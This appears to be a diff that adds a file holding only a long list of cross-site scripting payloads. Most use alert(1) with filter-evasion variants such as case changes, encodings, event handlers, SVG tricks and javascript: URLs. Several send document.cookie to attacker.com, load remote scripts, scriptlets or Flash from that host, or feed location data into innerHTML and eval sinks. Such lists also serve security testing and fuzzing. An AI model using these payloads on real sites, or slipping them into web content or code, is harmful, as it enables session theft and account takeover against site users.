@@ -1,0 +1,97 @@
+<script>alert(1)</script>
+<script>alert(document.domain)</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert(document.cookie)>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<body onload=alert(1)>
+<iframe onload=alert(1)>
+<input autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<details open ontoggle=alert(1)>
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<math><mtext></table></math><img src=x onerror=alert(1)>
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+javascript:alert(1)
+javascript:alert(document.cookie)
+javascript:alert(document.domain)
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+</script><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)>
+" onmouseover="alert(1)
+' onmouseover='alert(1)
+" onfocus="alert(1)" autofocus="
+<ScRiPt>alert(1)</ScRiPt>
+<SCRIPT>alert(1)</SCRIPT>
+<script>alert(1)//
+<script>alert`1`</script>
+<script>alert(1)<!--
+<script src=//attacker.com/xss.js></script>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<script>fetch('//attacker.com?c='+document.cookie)</script>
+<script>new Image().src='//attacker.com?c='+document.cookie</script>
+<script>document.location='//attacker.com?c='+document.cookie</script>
+%3Cscript%3Ealert(1)%3C/script%3E
+%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+&lt;script&gt;alert(1)&lt;/script&gt;
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+<script>alert(1)</script>
+<svg><script>alert&#40;1&#41;</script>
+<svg><script>alert(1)</script></svg>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><set attributename=x onbeginElement.call(this,alert(1))>
+<math><brute xlink:href="javascript:alert(1)">
+<table><td background="javascript:alert(1)">
+<div style="background:url(javascript:alert(1))">
+<div style="width:expression(alert(1))">
+<style>@import 'javascript:alert(1)'</style>
+<link rel=stylesheet href="javascript:alert(1)">
+<base href="javascript:alert(1)//">
+<!--<img src="--><img src=x onerror=alert(1)>-->
+<xss id=x tabindex=1 onfocus=alert(1)></xss>
+<xss style="behavior:url(#default#time2)" onbegin="alert(1)">
+" style="animation-name:progress" onanimationstart="alert(1)
+<iframe srcdoc="<script>alert(1)</script>">
+<iframe src="data:text/html,<script>alert(1)</script>">
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+{{constructor.constructor('alert(1)')()}}
+${alert(1)}
+#{alert(1)}
+<%-alert(1)%>
+</textarea><script>alert(1)</script>
+</title><script>alert(1)</script>
+</style><script>alert(1)</script>
+<script>window['alert'](1)</script>
+<script>self['alert'](1)</script>
+<script>top['alert'](1)</script>
+<script>(alert)(1)</script>
+<script>a=alert,a(1)</script>
+<script>Function('alert(1)')()</script>
+<script>[1].find(alert)</script>
+<script>setTimeout('alert(1)')</script>
+<script>setInterval('alert(1)',9999)</script>
+<img src=1 href=1 onerror="javascript:alert(1)"></img>
+<audio src=1 href=1 onerror="javascript:alert(1)"></audio>
+<video src=1 href=1 onerror="javascript:alert(1)"></video>
+<body/onload=alert(1)>
+<br size="&{alert(1)}">
+<a href="javascript\x3Aalert(1)">click</a>
+<a href="jav&#x09;ascript:alert(1)">click</a>
+<a href="jav&#x0A;ascript:alert(1)">click</a>
+<a href="jav&#x0D;ascript:alert(1)">click</a>
+<a href=" javascript:alert(1)">click</a>
+<a href="javascript:alert(1)" rel="opener">click</a>
+<form action="javascript:alert(1)"><button>submit</button></form>
+<isindex action="javascript:alert(1)" type=image>
+<object type="text/x-scriptlet" data="//attacker.com/xss.sct">
+<embed type="application/x-shockwave-flash" src="//attacker.com/xss.swf">
+postMessage payload: window.opener.location='//attacker.com?c='+document.cookie
+DOM: document.getElementById('output').innerHTML=location.hash.slice(1)
+DOM: eval(location.search.split('=')[1])
+DOM: document.write(decodeURIComponent(location.hash))
